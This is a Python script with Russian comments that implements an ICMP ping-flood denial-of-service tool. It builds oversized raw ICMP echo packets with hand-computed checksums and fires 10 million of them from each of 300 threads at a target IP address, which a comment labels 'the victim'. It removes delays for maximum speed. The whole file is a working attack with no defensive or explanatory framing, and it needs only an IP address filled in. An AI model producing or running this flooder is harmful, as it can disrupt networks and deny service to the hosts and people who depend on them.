import socket
import struct
import time
import threading

# Функция для отправки ICMP-флуда на хост
def icmp_flood(target_ip, packet_count):
    try:
        # Создаем raw-сокет
        with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP) as sock: # ipv4, cырые пакеты, icmp
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_TTL, struct.pack('I', 128)) # уровень ip, time-to-live (128 прыжков)
            sock.settimeout(1)

            # Создаем ICMP-пакет большого размера для увеличения сетевой нагрузки
            packet = create_icmp_packet()

            print(f"Начало ICMP-флуда на {target_ip}...")

            # Цикл для отправки заданного количества пакетов
            for i in range(packet_count):
                sock.sendto(packet, (target_ip, 1)) # 1 - № порта
                # Убираем задержку для максимальной скорости
                time.sleep(0.0001)  # Задержку можно полностью убрать
           #     if i % 10000 == 0:
           #         print(f"Отправлено {i+1} пакетов на {target_ip}")

    except Exception as e:
        print(f"Ошибка при отправке пакетов: {e}")

# Функция для создания ICMP-пакета
def create_icmp_packet():
    checksum = 0 # контр сумма
    header = struct.pack('bbHHh', 8, 0, checksum, 0, 1)  # ECHO, стандартный пинг, контр сум, идентификатор, номер послед (1)
    data = struct.pack('d', time.time()) + b'XQQ' * 1400  # Данные пакета (Qw*1400)
    checksum = calculate_checksum(header + data)
    header = struct.pack('bbHHh', 8, 0, checksum, 0, 1) # пересобираем пакет
    return header + data

# Функция для расчета контрольной суммы
def calculate_checksum(source_string):
    count_to = (len(source_string) // 2) * 2
    sum = 0
    count = 0

    while count < count_to: # обработка по 2 байта за раз
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff
        count = count + 2

    if count_to < len(source_string): # если нечет сум=+1
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff

    sum = (sum >> 16) + (sum & 0xffff) #инверсия контр суммы
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff
    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

# Основная программа для запуска нескольких потоков ICMP-флуда
def main():
    target_ip = ""  # IP адрес жертвы в локальной сети
    packet_count = 10000000  # Количество пакетов для флуда
    thread_count = 300  # Увеличиваем количество потоков для увеличения скорости

    threads = []

    for i in range(thread_count):
        thread = threading.Thread(target=icmp_flood, args=(target_ip, packet_count))
        thread.start()
        threads.append(thread)

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
